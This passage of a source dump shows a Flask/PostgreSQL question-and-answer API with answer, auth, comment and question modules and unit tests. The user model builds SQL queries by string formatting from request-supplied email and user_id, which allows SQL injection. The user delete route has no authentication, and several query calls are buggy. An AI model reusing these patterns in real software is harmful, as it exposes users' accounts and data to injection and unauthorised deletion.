question_blueprint\n    from .home.views import home_blueprint\n    from .auth.api.v1.view import auth_blueprint\n    from .answers.api.v1.view import answers_blueprint\n    from .votes.api.v1.view import votes_blueprint\n    from .comments.api.v1.view import comments_blueprint\n\n    app_blueprints = [\n        answers_blueprint,\n        question_blueprint,\n        auth_blueprint,\n        votes_blueprint,\n        comments_blueprint,\n        home_blueprint\n    ]\n\n    for bp in app_blueprints:\n        app.register_blueprint(bp)\n\n\ndef configure_extensions():\n    db.test()\n\n\nif __name__ == \"__main__\":\n    app = create_app(\"config\")\n    app.run(debug=True)\n/n/n/napp/answers/api/v1/view.py/n/n# APIs Resources\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Blueprint, request, make_response, jsonify, session\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\nanswers_blueprint = Blueprint('answers', __name__)\n\n\nclass CreateAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def put(self, question_id=None, answer_id=None):\n        data = request.get_json(force=True)\n        data['question_id'] = question_id\n        data['answer_id'] = answer_id\n        data['user_id'] = session.get('user_id')\n\n        response = Table(data).update()\n        if response == 200:\n            response_object = {\n                'status': 'success',\n                'message': 'Update successful'\n            }\n            return make_response(jsonify(response_object)), 200\n        if response == 302:\n            response_object = {\n                'status': 'fail',\n                'message': 'Please provide correct answer and question id'\n            }\n            return make_response(jsonify(response_object)), 400\n        if response == 203:\n            response_object = {\n                'status': 'fail',\n                'message': 'Unauthorized request.'\n            }\n            return make_response(jsonify(response_object)), 401\n\n        else:\n            response_object = {\n                'status': 'fail',\n                'message': 'Please provide correct answer and question id'\n            }\n            return make_response(jsonify(response_object)), 400\n\n    @jwt_required\n    def post(self, question_id=None):\n        # get the post data\n        data = request.get_json(force=True)\n        data['question_id'] = question_id\n        data['user_id'] = session.get('user_id')\n        answer = Table(data)\n        response = answer.save()\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': response\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Unknown question id. Try a different id.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\nclass ListAPIView(MethodView):\n    \"\"\"\n    List API Resource\n    \"\"\"\n    @jwt_required\n    def get(self, answer_id=None):\n        data = dict()\n        data['answer_id'] = answer_id\n        data['user_id'] = session.get('user_id')\n        if answer_id:\n            results = Table(data).filter_by()\n            if len(results) < 1:\n                response_object = {\n                    'results': 'Answer not found', 'status': 'fail'\n                }\n                return make_response(jsonify(response_object)), 404\n            response_object = {\n                'results': results, 'status': 'success'\n            }\n            return (jsonify(response_object)), 200\n        response_object = {'results': Table(data).query(), 'status': 'success'}\n        return (jsonify(response_object)), 200\n\n\n# Define the API resources\ncreate_view = CreateAPIView.as_view('create_api')\nlist_view = ListAPIView.as_view('list_api')\n\n# Add Rules for API Endpoints\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/<string:question_id>/answers',\n    view_func=create_view,\n    methods=['POST']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/<string:question_id>/answers/<string:answer_id>',\n    view_func=create_view,\n    methods=['PUT']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/answers',\n    view_func=list_view,\n    methods=['GET']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/answers/<string:answer_id>',\n    view_func=list_view,\n    methods=['GET']\n)\n/n/n/napp/answers/models.py/n/n# Custom Model\n\n# Author: P8ul\n# https://github.com/p8ul\n\n\"\"\"\n    This class will connect to a Database and perform crud actions\n    Has relevant getters, setters & mutation methods\n\"\"\"\n\nimport psycopg2\nimport psycopg2.extensions\nfrom psycopg2.extras import RealDictCursor\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Table:\n    def __init__(self, data={}):\n        self.config = db_config(BaseConfig.DATABASE_URI)\n        self.table = 'answers'\n        self.answer_body = data.get('answer_body')\n        self.question_id = data.get('question_id')\n        self.answer_id = data.get('answer_id')\n        self.accepted = data.get('accepted')\n        self.user_id = data.get('user_id')\n\n    def save(self):\n        \"\"\"\n        Creates an answer record in answers table\n        :return: None of inserted record\n        \"\"\"\n        con, response = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"INSERT INTO answers (user_id, answer_body, question_id) VALUES (%s, %s, %s) RETURNING *; \"\n            cur.execute(query, (self.user_id, self.answer_body, self.question_id))\n            con.commit()\n            response = cur.fetchone()\n        except Exception as e:\n            print(e)\n        con.close()\n        return response\n\n    def query(self):\n        \"\"\"\n        Fetch all records from a answers table\n        :return: list: query set\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        cur.execute(\n            \"\"\" SELECT *, ( SELECT  count(*) from votes \n                WHERE votes.answer_id=answers.answer_id AND vote=true ) as upVotes,\n                ( SELECT count(*) from votes WHERE votes.answer_id=answers.answer_id\n                AND vote=false ) as downVotes FROM  answers\n            \"\"\"\n        )\n        queryset_list = cur.fetchall()\n        con.close()\n        return queryset_list\n\n    def filter_by(self):\n        \"\"\"\n        Select a column(s) from answer table\n        :return: list: queryset list\n        \"\"\"\n        try:\n            con = psycopg2.connect(**self.config)\n            cur = con.cursor(cursor_factory=RealDictCursor)\n            query = \"SELECT * FROM answers WHERE answer_id=%s\"\n            cur.execute(query, self.answer_id)\n            queryset_list = cur.fetchall()\n            con.close()\n            return queryset_list\n        except:\n            return []\n\n    def question_author(self):\n        con = psycopg2.connect(**self.config)\n        try:\n            cur = con.cursor(cursor_factory=RealDictCursor)\n            query = \"SELECT user_id FROM questions WHERE question_id=%s\"\n            cur.execute(query, self.question_id)\n            return cur.fetchall()\n\n        except Exception as e:\n            print(e)\n        con.close()\n        return False\n\n    def answer_author(self):\n        try:\n            con = psycopg2.connect(**self.config)\n            cur = con.cursor(cursor_factory=RealDictCursor)\n            query = \"SELECT user_id FROM answers WHERE answer_id=%s\"\n            cur.execute(query, self.answer_id)\n            queryset_list = cur.fetchall()\n            con.close()\n            return queryset_list\n        except Exception as e:\n            return False\n\n    def update(self):\n        try:\n            answer_author = self.answer_author()[0].get('user_id')\n            question_author = self.question_author()[0].get('user_id')\n            # current user is the answer author\n            if answer_author == self.user_id:\n                # update answer\n                response = 200 if self.update_answer() else 304\n                return response\n\n            # current user is question author\n            elif question_author == self.user_id:\n                # mark it as accepted\n                response = self.update_accept_field()\n                response = 200 if response else 304\n                return response\n\n            # other users\n            else:\n                return 203\n        except:\n            return 404\n\n    def update_accept_field(self):\n        \"\"\"\n        Update an answer column\n        :return: bool:\n        \"\"\"\n        con, result = psycopg2.connect(**self.config), True\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"UPDATE answers SET accepted=%s WHERE answer_id=%s AND question_id=%s\"\n            cur.execute(query, (self.accepted, self.answer_id, self.question_id))\n            con.commit()\n        except Exception as e:\n            print(e)\n            result = False\n        con.close()\n        return result\n\n    def update_answer(self):\n        \"\"\"\n        Update an answer column\n        :return: bool:\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"UPDATE answers SET answer_body=%s WHERE answer_id=%s\"\n            cur.execute(query, (self.answer_body, self.answer_id))\n            con.commit()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        con.close()\n        return True\n\n    def delete(self):\n        pass\n\n\n\n/n/n/napp/answers/test/base.py/n/nimport unittest\n\nfrom ... import create_app\napp = create_app(\"config.TestConfig\")\n\n\nclass BaseTestCase(unittest.TestCase):\n    \"\"\"A base test case.\"\"\"\n    def create_app(self):\n        app.config.from_object('config.TestConfig')\n        return app\n\n    def setUp(self):\n        # method to invoke before each test.\n        self.client = app.test_client()\n        self.data = {\n            'username': 'Paul',\n            'email': 'pkinuthia10@gmail.com',\n            'password': 'password'\n        }\n        \"\"\" Login to get a JWT token \"\"\"\n        self.client.post('/api/v1/auth/signup', json=self.data)\n        response = self.client.post('/api/v1/auth/login', json=self.data)\n        self.token = response.get_json().get('auth_token')\n        self.user_id = str(response.get_json()['id'])\n\n    def tearDown(self):\n        # method to invoke after each test.\n        pass\n/n/n/napp/answers/test/test_answer_model.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\nfrom ..models import Table\n\ntable = Table()\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test question model  \"\"\"\n    def test_question_model(self):\n        query = table.query()\n        self.assertIsInstance(query, type([]))\n\n    def test_model_filter(self):\n        query = table.filter_by()\n        self.assertEqual(query, [])\n\n    def test_model_save(self):\n        query = table.save()\n        self.assertEqual(query, None)\n\n    def test_model_update(self):\n        query = table.update()\n        self.assertEqual(query, 404)\n\n    def test_model_delete(self):\n        query = table.delete()\n        self.assertEqual(query, None)\n\n    def test_model_question_author(self):\n        query = table.question_author()\n        self.assertEqual(query, False)\n\n    def test_model_answer_author(self):\n        query = table.answer_author()\n        self.assertEqual(query, False)\n\n    def test_model_accept(self):\n        query = table.update_accept_field()\n        self.assertEqual(query, True)\n\n    def test_model_update_answer(self):\n        query = table.update_answer()\n        self.assertEqual(query, True)\n\n    def test_model_init(self):\n        keys = table.config.keys()\n        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])\n        self.assertEqual(len(list(keys)), 4)\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/answers/test/test_answers_apis.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test List answers api \"\"\"\n    def test_list_answers(self):\n        response = self.client.get(\n            '/api/v1/questions/answers',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.get_json()['status'], 'success')\n\n    \"\"\" Test answers CRUD api \"\"\"\n    def test_post_update(self):\n        \"\"\" Initialize test data \"\"\"\n        data = {\n            'title': 'Test title',\n            'body': 'Test body',\n            'answer_body': 'Test answer',\n            'user': self.user_id\n        }\n\n        \"\"\" Add test question\"\"\"\n        self.client.post(\n            '/api/v1/questions/', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        response = self.client.get(\n            '/api/v1/questions/',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        question_id = response.get_json().get('results')[0].get('question_id')\n\n        \"\"\" Test post answer \"\"\"\n        response = self.client.post(\n            '/api/v1/questions/'+str(question_id)+'/answers', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        \"\"\" Test status \"\"\"\n        self.assertEqual(response.status_code, 201)\n\n        \"\"\" Test if a question is created \"\"\"\n        self.assertEqual(response.get_json()['status'], 'success')\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/auth/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify, session\nfrom flask.views import MethodView\nfrom flask_bcrypt import Bcrypt\nfrom ...models import Table\nfrom ....utils import jwt_required, encode_auth_token\nfrom ...validatons import validate_user_details\n\n# globals b_crypt\nb_crypt = Bcrypt()\nauth_blueprint = Blueprint('auth', __name__)\n\n\nclass RegisterAPI(MethodView):\n    \"\"\" User Signup API Resource \"\"\"\n    def post(self):\n        # get the post data\n        data = request.get_json(force=True)\n        data['user_id'] = session.get('user_id')\n        # check if user already exists\n        errors = validate_user_details(data)\n        if len(errors) > 0:\n            response_object = {\n                'status': 'fail', 'errors': errors\n            }\n            return make_response(jsonify(response_object)), 401\n        user = Table(data).filter_by_email()\n        if not user:\n            try:\n                user = Table(data).save()\n                auth_token = encode_auth_token(user.get('id')).decode()\n                response_object = {\n                    'status': 'success',\n                    'message': 'Successfully registered.',\n                    'id': user.get('id'), 'auth_token': auth_token\n                }\n                return make_response(jsonify(response_object)), 201\n            except Exception as e:\n                print(e)\n                response_object = {\n                    'status': 'fail', 'message': 'Some error occurred. Please try again.'\n                }\n                return make_response(jsonify(response_object)), 401\n        else:\n            response_object = {\n                'status': 'fail', 'message': 'User already exists. Please Log in.',\n            }\n            return make_response(jsonify(response_object)), 202\n\n    def delete(self, user_id=None):\n        data = request.get_json(force=True)\n        data['user_id'] = user_id\n        Table(data).delete()\n        response_object = {\n            'status': 'success', 'message': 'User deleted successfully.',\n        }\n        return make_response(jsonify(response_object)), 200\n\n\nclass LoginAPI(MethodView):\n    \"\"\" User Login API Resource \"\"\"\n    def post(self):\n        data = request.get_json(force=True)\n        data['user_id'] = session.get('user_id')\n        try:\n            user = Table(data).filter_by_email()\n            if len(user) >= 1 and data.get('password'):\n                if b_crypt.check_password_hash(user[0].get('password'), data.get('password')):\n                    auth_token = encode_auth_token(user[0].get('user_id'))\n                else:\n                    response_object = {'status': 'fail', 'message': 'Password or email do not match.'}\n                    return make_response(jsonify(response_object)), 401\n                try:\n                    if auth_token:\n                        response_object = {\n                            'status': 'success', 'id': user[0].get('user_id'),\n                            'message': 'Successfully logged in.',\n                            'auth_token': auth_token.decode()\n                        }\n                        return make_response(jsonify(response_object)), 200\n                except Exception as e:\n                    return {\"message\": 'Error decoding token'}, 401\n            else:\n                response_object = {'status': 'fail', 'message': 'User does not exist.'}\n                return make_response(jsonify(response_object)), 404\n        except Exception as e:\n            print(e)\n            response_object = {'status': 'fail', 'message': 'Try again'}\n            return make_response(jsonify(response_object)), 500\n\n\nclass UserListAPI(MethodView):\n    \"\"\" User List Api Resource \"\"\"\n    @jwt_required\n    def get(self, user_id=None):\n        if user_id:\n            user = Table({\"user_id\": user_id}).filter_by()\n            if len(user) < 1:\n                response_object = {\n                    'results': 'User not found',\n                    'status': 'fail'\n                }\n                return make_response(jsonify(response_object)), 404\n            response_object = {\n                'results': user,\n                'status': 'success'\n            }\n            return (jsonify(response_object)), 200\n\n        response_object = {\n            'results': Table().query(),\n            'status': 'success'\n        }\n        return (jsonify(response_object)), 200\n\n\nclass LogoutAPI(MethodView):\n    \"\"\" Logout Resource \"\"\"\n    def post(self):\n        # get auth token\n        auth_header = request.headers.get('Authorization')\n        return auth_header\n\n\n# Define the API resources\nregistration_view = RegisterAPI.as_view('register_api')\nlogin_view = LoginAPI.as_view('login_api')\nuser_view = UserListAPI.as_view('user_api')\nlogout_view = LogoutAPI.as_view('logout_api')\n\n# Add Rules for API Endpoints\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/signup',\n    view_func=registration_view,\n    methods=['POST']\n)\n\n# Add Rules for API Endpoints\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/delete',\n    view_func=registration_view,\n    methods=['DELETE']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/login',\n    view_func=login_view,\n    methods=['POST']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/users',\n    view_func=user_view,\n    methods=['GET']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/users/<string:user_id>',\n    view_func=user_view,\n    methods=['GET']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/logout',\n    view_func=logout_view,\n    methods=['POST']\n)\n/n/n/napp/auth/models.py/n/n# Custom Model\n\n# Author: P8ul\n# https://github.com/p8ul\n\n\"\"\"\n    This class will act as a table in a Database\n    Has relevant getters, setters & mutation methods\n\"\"\"\nimport psycopg2\nimport psycopg2.extras\nfrom psycopg2.extras import RealDictCursor\nfrom flask_bcrypt import Bcrypt\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Table:\n    def __init__(self, data={}):\n        self.config = db_config(BaseConfig.DATABASE_URI)\n        self.table, self.email = 'users', data.get('email')\n        self.username = data.get('username')\n        self.user_id = data.get('user_id')\n        self.b_crypt = Bcrypt()\n        if data.get('password'):\n            self.password = self.b_crypt.generate_password_hash(data.get('password')).decode('utf-8')\n\n    def query(self):\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)\n        cur.execute(\"select * from {}\".format(self.table))\n        queryset_list = cur.fetchall()\n        con.close()\n        return [item for item in queryset_list]\n\n    def filter_by(self):\n        con, queryset_list = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            cur.execute(\"select * from {} WHERE user_id='{}'\".format(self.table, self.user_id))\n            queryset_list = cur.fetchall()\n        except Exception as e:\n            print(e)\n        con.close()\n        return queryset_list\n\n    def filter_by_email(self):\n        con, queryset_list = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            cur.execute(\"select * from {} WHERE email='{}'\".format(self.table, self.email))\n            queryset_list = cur.fetchall()\n        except Exception as e:\n            print(e)\n        con.close()\n        return queryset_list\n\n    def update(self):\n        pass\n\n    def delete(self):\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)\n        try:\n            query = \"DELETE FROM users WHERE email=%s\"\n            cur.execute(query, self.email)\n            con.commit()\n            con.close()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        return True\n\n    def save(self):\n        con, response = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"INSERT INTO users (username, email, password) values(%s, %s, %s) RETURNING *\"\n            cur.execute(query, (self.username, self.email, self.password))\n            con.commit()\n            response = cur.fetchone()\n        except Exception as e:\n            print(e)\n        con.close()\n        return response\n/n/n/napp/auth/test/test_model.py/n/nfrom .base import BaseTestCase\nfrom ..models import Table\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test signup api \"\"\"\n    def test_model_crud(self):\n        table = Table(self.data)\n        # Test Create\n        instance = table.save()\n        assert instance.get('email') == self.data.get('email')\n\n        # Test query\n        isinstance(table.query(), type([]))\n/n/n/napp/auth/test/test_user_validation.py/n/nfrom .base import BaseTestCase\nfrom ..validatons import validate_user_details\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test user details validation \"\"\"\n    def test_model_crud(self):\n        data = {\"email\": \"\", 'password': ''}\n        # Test Create\n        instance = validate_user_details(data)\n        assert instance.get('email') == 'Invalid email. Please enter a valid email'\n\n/n/n/napp/auth/validatons.py/n/nfrom ..utils import valid_email\n\n\ndef validate_user_details(data):\n    errors = {}\n    if not valid_email(data.get('email')):\n        errors['email'] = 'Invalid email. Please enter a valid email'\n    if not data.get('email'):\n        errors['password'] = 'Password required'\n    return errors\n/n/n/napp/comments/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\ncomments_blueprint = Blueprint('comments', __name__)\n\n\nclass ListAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def post(self, answer_id=None):\n        data = request.get_json(force=True)\n        data['answer_id'] = answer_id\n        response = Table(data).save()\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': 'Your comment was successful'\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Some error occurred. Please try again.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\n# Define the API resources\ncomment_view = ListAPIView.as_view('comment_api')\n\n# Add Rules for API Endpoints\ncomments_blueprint.add_url_rule(\n    '/api/v1/questions/answers/comment/<string:answer_id>',\n    view_func=comment_view,\n    methods=['POST']\n)\n/n/n/napp/comments/models.py/n/n\"\"\"\n    Author: P8ul\n    https://github.com/p8ul\n\n    This class will connect to a Database and perform crud actions\n    Has relevant getters, setters & mutation methods\n\"\"\"\nimport psycopg2\nimport psycopg2.extensions\nfrom psycopg2.extras import RealDictCursor\nfrom flask import session\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Table:\n    def __init__(self, data={}):\n        self.config = db_config(BaseConfig.DATABASE_URI)\n        self.table = 'comments'\n        self.answer_id = data.get('answer_id')\n        self.question_id = data.get('question_id')\n        self.comment_body = data.get('comment_body')\n\n    def save(self):\n        \"\"\"\n        Insert a comment in comments table\n        :return: True if record values are inserted successfully else false\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"INSERT INTO comments(user_id, answer_id, comment_body) values(%s, %s, %s) \"\n            cur.execute(query, (session.get('user_id'), self.answer_id, self.comment_body))\n            con.commit()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        return True\n/n/n/napp/comments/test/__init__.py/n/n/n/n/napp/comments/test/test_comment_api.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test List comment api \"\"\"\n    def test_comments_api(self):\n        response = self.client.post(\n            '/api/v1/questions/answers/comment/3', data=self.data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        assert response.status_code == 400\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/comments/test/test_comment_model.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\nfrom ..models import Table\n\ntable = Table()\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test votes model  \"\"\"\n    def test_model_save(self):\n        query = table.save()\n        self.assertEqual(query, False)\n\n    def test_model_init(self):\n        keys = table.config.keys()\n        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])\n        self.assertEqual(len(list(keys)), 4)\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/migrations/db.py/n/nimport psycopg2\nimport psycopg2.extras\n\nfrom .initial1 import migrations\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Database:\n    def __init__(self, config):\n        self.config = db_config(config)\n        self.database = self.config.get('database')\n\n    def test(self):\n        con = psycopg2.connect(**self.config)\n        con.autocommit = True\n        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)\n        cur.execute(\"select * from pg_database where datname = %(database_name)s\", {'database_name': self.database})\n        databases = cur.fetchall()\n        if len(databases) > 0:\n            print(\" * Database {} exists\".format(self.database))\n            for command in migrations:\n                try:\n                    cur.execute(command)\n                    con.commit()\n                except Exception as e:\n                    print(e)\n        else:\n            print(\" * Database {} does not exists\".format(self.database))\n        con.close()\n\n\ndb = Database(BaseConfig.DATABASE_URI)\n/n/n/napp/postman/document.py/n/nimport json\nfrom urllib.parse import urlparse\n\n\nclass ApiDocumentGen:\n    def __init__(self, file):\n        self.file = file\n        self.data = {}\n        self.name = ''\n        self.description = ''\n        self.domain = ''\n        self.api_version = '/api/v1'\n        self.output_file = 'apiary.apid'\n        self.file_format = 'FORMAT: 1A'\n        self.requests = []\n        self.get_data()\n        self.data_out()\n\n    def get_data(self):\n        with open(self.file, encoding='utf-8') as f:\n            self.data = json.loads(f.read())\n        self.name = self.data['name']\n        self.description = self.data['description']\n        self.get_url_info()\n\n    def data_out(self):\n        # write document introduction\n        doc = open(self.output_file, 'w+')\n        doc.write(self.file_format + '\\n')\n        doc.write('HOST: ' + self.domain + '\\n\\n')\n        doc.write('# ' + self.name + '\\n\\n')\n        doc.write(self.description)\n        doc.close()\n\n        for request in self.data.get('requests'):\n            self.process_requests(request)\n\n    def process_requests(self, request):\n        url = urlparse(request.get('url'))\n        path = url.path.replace(self.api_version, '')\n        self.domain, description = url, request.get('description')\n        method, name = request.get('method'), request.get('name')\n        content_type = 'application/json'\n        collection_name = '## ' + name + ' [' + path + ']\\n'\n        title = '### ' + name + ' [' + method + ']'\n        req = '+ Request (' + content_type + ')'\n        resp = '+ Response 201 (' + content_type + ')'\n\n        doc = open(self.output_file, 'a')\n        doc.write(collection_name + '\\n\\n')\n        doc.write(title + '\\n')\n        doc.write(description + '\\n\\n')\n        if method == \"POST\":\n            doc.write(req + '\\n\\n')\n            json_data = json.loads(request.get('rawModeData'))\n            json.dump(json_data, doc, indent=8, sort_keys=True, ensure_ascii=False)\n            doc.write('\\n\\n\\n')\n\n        doc.write(resp + '\\n\\n\\n')\n        doc.close()\n\n    def get_url_info(self):\n        url = self.data.get('requests')[0].get('url')\n        domain = urlparse(url)\n        self.domain = url.replace(domain.path, '') + self.api_version\n\n\nif __name__ == \"__main__\":\n    app = ApiDocumentGen('data.json')\n    # app.main()\n\n/n/n/napp/questions/api/v1/view.py/n/n# APIs Resources\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Blueprint, request, make_response, jsonify, session\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\nquestion_blueprint = Blueprint('questions', __name__)\n\n\nclass CreateAPIView(MethodView):\n    \"\"\"\n    Create API Resource\n    \"\"\"\n    @jwt_required\n    def post(self):\n        # get the post data\n        data = request.get_json(force=True)\n        data['user_id'] = session.get('user_id')\n        row = Table(data).save()\n        if row:\n            response_object = {\n                'status': 'success',\n                'results': row\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Some error occurred. Please try again.'\n        }\n        return make_response(jsonify(response_object)), 401\n\n    \"\"\" UPDATE QUESTION \"\"\"\n    @jwt_required\n    def put(self, question_id=None):\n        # get the post data\n        data = request.get_json(force=True)\n        data['question_id'] = question_id\n        data['user_id'] = session.get('user_id')\n        result = Table(data).update()\n        if result:\n            response_object = {\n                'status': 'success',\n                'results': data\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Some error occurred. Please try again.'\n        }\n        return make_response(jsonify(response_object)), 401\n\n    \"\"\" DELETE QUESTION \"\"\"\n    @jwt_required\n    def delete(self, question_id=None):\n        data = dict()\n        data['user_id'], data['question_id'] = session.get('user_id'), question_id\n        response = Table(data).delete()\n        if response == 401:\n            response_object = {\n                'status': 'fail',\n                'message': 'Unauthorized, You cannot delete this question!.'\n            }\n            return make_response(jsonify(response_object)), 401\n        if response == 404:\n            response_object = {'status': 'fail', 'message': 'Some error occurred. Question Not Found!.'}\n            return make_response(jsonify(response_object)), 404\n        if not response:\n            response_object = {\n                'status': 'fail',\n                'message': 'Some error occurred. Please try again.'\n            }\n            return make_response(jsonify(response_object)), 400\n        response_object = {\n            'status': 'success',\n            'message': 'Question deleted successfully'\n        }\n        return make_response(jsonify(response_object)), 200\n\n\nclass ListAPIView(MethodView):\n    \"\"\" List API Resource \"\"\"\n    @jwt_required\n    def get(self, instance_id=None, user_id=None):\n        data = dict()\n        data['question_id'], data['user_id'] = instance_id, session.get('user_id')\n        if user_id:\n            results = Table({}).filter_by_user()\n            if results:\n                response_object = {'results': results, 'status': 'success'}\n                return make_response(jsonify(response_object)), 200\n        if instance_id:\n            results = Table(data).filter_by()\n            if not results:\n                response_object = {'status': 'fail', 'message': 'Bad request.'}\n                return make_response(jsonify(response_object)), 400\n            if len(results) < 1:\n                response_object = {'results': 'Question not found', 'status': 'error'}\n                return make_response(jsonify(response_object)), 404\n            response_object = {'results': results, 'status': 'success'}\n            return make_response(jsonify(response_object)), 200\n        response_object = {\n            'results': Table({'q': request.args.get('q')}).query(), 'status': 'success'\n        }\n        return (jsonify(response_object)), 200\n\n\nclass UserQuestionsListAPIView(MethodView):\n    \"\"\"\n    List API Resource\n    \"\"\"\n    @jwt_required\n    def get(self, user):\n        data = {'user_id': session.get('user_id')}\n        results = Table(data).filter_by_user()\n        if results:\n            response_object = {'results': results, 'status': 'success'}\n            return (jsonify(response_object)), 200\n\n        response_object = {'results': 'Bad Request'}\n        return (jsonify(response_object)), 400\n\n\n# Define the API resources\ncreate_view = CreateAPIView.as_view('create_api')\nlist_view = ListAPIView.as_view('list_api')\nuser_questions_list_view = ListAPIView.as_view('user_questions_api')\n\n# Add Rules for API Endpoints\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/',\n    view_func=create_view,\n    methods=['POST']\n)\n\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/<string:question_id>',\n    view_func=create_view,\n    methods=['DELETE']\n)\n\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/<string:question_id>',\n    view_func=create_view,\n    methods=['PUT']\n)\n\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/',\n    view_func=list_view,\n    methods=['GET']\n)\n\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/user/<string:user_id>',\n    view_func=user_questions_list_view,\n    methods=['GET']\n)\n\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/<string:instance_id>',\n    view_func=list_view,\n    methods=['GET']\n)\n/n/n/napp/questions/models.py/n/n# Custom Model\n\n# Author: P8ul\n# https://github.com/p8ul\n\n\"\"\"\n    This class will connect to a Database and perform crud actions\n    Has relevant getters, setters & mutation methods\n\"\"\"\nimport psycopg2\nimport psycopg2.extensions\nfrom psycopg2.extras import RealDictCursor\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Table:\n    def __init__(self, data={}):\n        self.config = db_config(BaseConfig.DATABASE_URI)\n        self.table, self.title = 'questions', data.get('title')\n        self.body, self.q = data.get('body'), data.get('q')\n        self.question_id = data.get('question_id')\n        self.user_id = data.get('user_id')\n\n    def save(self):\n        \"\"\" Create a question record in questions table\n        :return: None or record values\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur, response = con.cursor(cursor_factory=RealDictCursor), None\n        try:\n            query = \"INSERT INTO questions (title, body, user_id) VALUES (%s, %s, %s) RETURNING *\"\n            cur.execute(query, (self.title, self.body, self.user_id))\n            con.commit()\n            response = cur.fetchone()\n        except Exception as e:\n            print(e)\n        con.close()\n        return response\n\n    def query(self):\n        \"\"\"Query the data in question table :return: list: query set list\"\"\"\n     